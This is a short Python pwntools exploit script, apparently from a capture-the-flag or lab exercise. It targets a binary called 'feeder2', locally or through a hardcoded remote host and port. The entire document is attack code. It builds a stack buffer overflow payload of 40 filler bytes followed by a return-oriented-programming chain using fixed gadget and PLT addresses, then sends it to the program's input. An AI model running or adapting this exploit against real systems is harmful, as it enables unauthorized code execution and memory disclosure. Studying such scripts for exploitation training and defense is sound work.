from pwn import *
import sys


local = True

if not local:
    HOST = "141.85.224.103"
    PORT = 31337
    io = remote(HOST, PORT)
else:
    io = process("./feeder2")


pop_rdi_ret = 0x400743
printf_plt = 0x400520
puts_plt = 0x400510

ropchain = p64(pop_rdi_ret) + p64(puts_plt) + p64(puts_plt)

payload = "A" * 40 + ropchain


# f = open("payload", "w")
# f.write(payload)
# f.close()

# Trigger exploit by sending payload to standard input.
print io.recvline()
print io.recvline()
print io.recvline()

io.sendline(payload)

print io.recvline()

# io.interactive()
